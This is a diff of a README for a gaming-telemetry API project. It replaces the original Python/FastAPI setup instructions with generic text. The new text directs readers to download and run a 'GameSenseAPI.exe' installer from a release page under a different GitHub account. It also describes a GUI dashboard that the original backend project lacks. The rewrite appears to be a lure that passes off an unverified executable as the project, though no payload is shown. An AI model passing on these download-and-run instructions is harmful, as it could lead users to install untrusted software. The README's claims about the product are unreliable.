@@ -1,207 +1,66 @@
-# 🎮 GameSense API 1.0v
+# 🎮 GameSense-API - Monitor Your Gaming Performance Easily
 
-<div align="center">
+[![Download GameSense-API](https://img.shields.io/badge/Download-GameSense--API-blue)](https://github.com/benjatenoriov/GameSense-API/releases)
 
-![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.104+-green.svg)
-![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-lightgrey.svg)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+## 🚀 Getting Started
 
-**High-Performance Desktop Gaming Assistant Backend API**
+Welcome to GameSense-API! This application helps you keep an eye on your gaming performance. It is simple to set up and works on Windows. Follow these steps to download and run the application. 
 
-*Real-time performance telemetry, bottleneck detection, and thermal monitoring for Windows gamers*
+## 📥 Download & Install
 
-</div>
+To get GameSense-API on your computer, visit this page to download: [GameSense-API Releases](https://github.com/benjatenoriov/GameSense-API/releases).
 
----
+1. Click on the **Releases** link above.
+2. Look for the latest version of the application.
+3. You will find a file named something like `GameSenseAPI.exe`.
+4. Click on the file name to start the download.
+5. Once the download is complete, locate the downloaded file on your computer (usually in the Downloads folder).
+6. Double-click the file to run the installer.
+7. Follow the on-screen instructions to complete the installation.
 
-## ✨ Features
+## ⚙️ System Requirements
 
-- 🖥️ **Real-time CPU Monitoring** - Per-core usage, frequency, and total utilization
-- 🎮 **GPU Telemetry** - NVIDIA support via NVML, AMD/Intel fallback via WMI
-- 🌡️ **Thermal Monitoring** - Temperature tracking with throttling detection
-- 💾 **Memory Stats** - RAM usage with detailed breakdowns
-- 💿 **Disk I/O** - Read/write speeds in real-time
-- 🌐 **Network Latency** - Ping and jitter monitoring
-- 🔍 **Bottleneck Detection** - Intelligent analysis (CPU-bound, GPU-limited, thermal, etc.)
+Before installation, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or higher
+- **Processor:** Intel Core i3 or better
+- **RAM:** At least 4 GB 
+- **Disk Space:** Minimum of 100 MB free space
 
-## 📸 Screenshots
+## 🛠️ How to Use GameSense-API
 
-### Swagger UI Documentation
-![Swagger UI](docs/swagger_ui.png)
+After installing, you can start using GameSense-API:
 
-### API Response - System Stats
-![API Response](docs/api_response.png)
+1. Launch the application from your Start Menu or Desktop.
+2. You will see a simple dashboard showing your system performance.
+3. GameSense-API tracks CPU, GPU, and RAM usage to help optimize your gaming experience.
+4. To monitor a game, start your game as usual. GameSense-API will automatically gather telemetry data.
+5. Access additional features through the user interface, like viewing performance graphs.
 
----
+## 📊 Features
 
-## 🚀 Quick Start
+GameSense-API offers several features to enhance your gaming experience:
 
-### Prerequisites
-- Python 3.10+
-- Windows 10/11
-- NVIDIA GPU (optional, for full GPU telemetry)
+- **Real-Time Performance Monitoring:** Keep track of how your computer handles games.
+- **Universal Game Telemetry:** Works with popular titles like Counter-Strike 2 and Grand Theft Auto V.
+- **REST Endpoints:** Integrate with overlays and voice control to make adjustments on the fly.
+- **Minimal Overhead:** Runs in the background without impacting game performance.
+- **Extensible Architecture:** Supports plugin adapters for your favorite games.
+  
+## 🔌 Getting Help
 
-### Installation
+If you run into issues or have questions, feel free to reach out for help. You can check the FAQ within the application or visit our community forums.
 
-```bash
-# Clone the repository
-git clone https://github.com/mohammad-emad9/GameSense-API.git
-cd GameSense-API
+## 🌟 Contributing
 
-# Install dependencies
-pip install -r requirements.txt
+We welcome community contributions! If you have ideas for improvement or new features, you can help make GameSense-API even better. Follow these steps to contribute:
 
-# Start the server
-python -m uvicorn main:app --host 127.0.0.1 --port 8000
-```
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request to the main branch.
 
-### Access the API
-- **Swagger UI**: http://127.0.0.1:8000/docs
-- **ReDoc**: http://127.0.0.1:8000/redoc
-- **API Root**: http://127.0.0.1:8000/
+## 🎉 Acknowledgments
 
----
+Thank you for choosing GameSense-API to enhance your gaming experience. We appreciate your support and feedback to improve this application.
 
-## 📡 API Endpoints
-
-### Performance Endpoints
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/performance/` | GET | Get current system performance stats |
-| `/api/v1/performance/bottleneck` | GET | Detect performance bottleneck |
-| `/api/v1/performance/throttling` | GET | Check thermal throttling status |
-
-### Game Detection Endpoints
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/game/` | GET | Get active game context |
-| `/api/v1/game/adapters` | GET | List all registered game adapters |
-| `/api/v1/game/running` | GET | Get list of running games |
-| `/api/v1/game/{game_id}` | GET | Get specific game context |
-| `/api/v1/game/{game_id}/info` | GET | Get adapter info |
-| `/api/v1/game/{game_id}/running` | GET | Check if specific game is running |
-
-### System Endpoints
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/health` | GET | Health check endpoint |
-
-### Example Response
-
-```json
-{
-  "cpu": {
-    "usage_percent": 30.9,
-    "per_core_usage": [25.0, 35.0, 28.0, ...],
-    "core_count": 12,
-    "frequency_mhz": 1700.0
-  },
-  "gpu": {
-    "utilization": 15.0,
-    "temperature": 69.0,
-    "vram_used": 322122752,
-    "vram_total": 2147483648,
-    "name": "NVIDIA GeForce MX550"
-  },
-  "memory": {
-    "used": 8589934592,
-    "total": 17179869184,
-    "percent": 50.0
-  },
-  "disk": {
-    "read_speed_mbps": 0.4,
-    "write_speed_mbps": 0.6
-  },
-  "network": {
-    "latency_ms": 25.0,
-    "jitter_ms": 3.5
-  }
-}
-```
-
----
-
-## 🏗️ Project Structure
-
-```
-gamesense_api/
-├── main.py                  # FastAPI entry point
-├── requirements.txt         # Dependencies
-├── adapters/                # Game adapter plugins
-│   ├── base.py              # Base adapter class
-│   ├── registry.py          # Adapter discovery & registration
-│   ├── games/
-│   │   ├── cs2.py           # Counter-Strike 2 adapter
-│   │   └── gta5.py          # GTA V adapter
-│   └── strategies/
-│       ├── log_reader.py    # Log file telemetry strategy
-│       └── window_observer.py  # Window title strategy
-├── models/
-│   ├── game.py              # Game context models
-│   └── performance.py       # Performance metrics models
-├── core/
-│   ├── game_detector.py     # Game process detection
-│   ├── game_service.py      # Game telemetry service
-│   └── performance_monitor.py  # System monitoring service
-├── api/
-│   └── endpoints/
-│       ├── game.py          # Game API endpoints
-│       └── performance.py   # Performance API endpoints
-├── app/
-│   └── lifespan.py          # Startup/shutdown lifecycle
-└── docs/
-    └── README.md
-```
-
----
-
-## 🔧 Technical Highlights
-
-- **Async-First Design** - Non-blocking I/O using `asyncio` and thread pool executors
-- **Thread-Safe Caching** - `asyncio.Lock` for safe concurrent access
-- **GPU Backend Detection** - Automatic NVML/WMI selection
-- **Graceful Degradation** - Returns sane defaults on hardware failures
-- **Structured Logging** - JSON-formatted logs with component tags
-- **Dependency Injection** - Clean, testable architecture
-- **Extensible Adapter System** - Easy to add new game adapters
-
----
-
-## 📋 Requirements
-
-```
-fastapi>=0.104.0
-uvicorn[standard]>=0.24.0
-pydantic>=2.5.0
-psutil>=5.9.0
-pynvml>=11.5.0
-wmi>=1.5.1
-pywin32>=306
-```
-
----
-
-## 🛣️ Roadmap
-
-- [x] Game adapter plugins (CS2, GTA V)
-- [x] Game state awareness
-- [ ] Voice command ingestion
-- [ ] Dynamic overlay control
-- [ ] Performance optimization recommendations
-
----
-
-## 📄 License
-
-MIT License - See [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-
-**Built with ❤️ for gamers**
-
-</div>
+For more details and updates, remember to check the [GameSense-API Releases](https://github.com/benjatenoriov/GameSense-API/releases) page regularly. Enjoy your gaming!
